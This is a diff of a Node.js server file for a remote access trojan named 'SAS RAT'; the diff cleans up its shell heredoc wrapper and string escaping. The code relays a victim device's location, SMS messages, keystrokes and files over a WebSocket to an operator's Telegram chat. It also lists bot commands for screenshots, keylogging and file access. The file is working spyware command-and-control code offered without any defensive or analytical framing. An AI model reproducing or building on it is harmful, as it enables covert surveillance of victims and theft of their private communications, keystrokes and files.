@@ -1,4 +1,3 @@
-cat > server.js << EOF
 const TelegramBot = require('node-telegram-bot-api');
 const WebSocket = require('ws');
 const express = require('express');
@@ -21,9 +20,9 @@ wss.on('connection', (ws) => {
     } else if (msg.type === 'location') {
       bot.sendLocation(CHAT_ID, msg.lat, msg.lon, { caption: '📍 Location' });
     } else if (msg.type === 'sms') {
-      bot.sendMessage(CHAT_ID, \`📱 SMS: \${msg.content}\`);
+      bot.sendMessage(CHAT_ID, `📱 SMS: ${msg.content}`);
     } else if (msg.type === 'keylog') {
-      bot.sendMessage(CHAT_ID, \`⌨️ Keylog: \${msg.keys}\`);
+      bot.sendMessage(CHAT_ID, `⌨️ Keylog: ${msg.keys}`);
     } else if (msg.type === 'files') {
       bot.sendDocument(CHAT_ID, msg.data, { caption: '📁 File from device' });
     }
@@ -36,7 +35,7 @@ wss.on('connection', (ws) => {
 
 bot.onText(/\/start/, (msg) => {
   if (msg.chat.id.toString() === CHAT_ID) {
-    bot.sendMessage(CHAT_ID, '🤖 SAS RAT Ready! Commands:\\n/screenshot - Take photo\\n/location - Get location\\n/sms - List SMS\\n/keylog - Start keylogger\\n/files - List files\\n/help - This menu');
+    bot.sendMessage(CHAT_ID, '🤖 SAS RAT Ready! Commands:\n/screenshot - Take photo\n/location - Get location\n/sms - List SMS\n/keylog - Start keylogger\n/files - List files\n/help - This menu');
   }
 });
 
@@ -58,4 +57,3 @@ bot.onText(/\/help/, (msg) => {
 });
 
 console.log('Bot started! Send /start to chat.');
-EOF
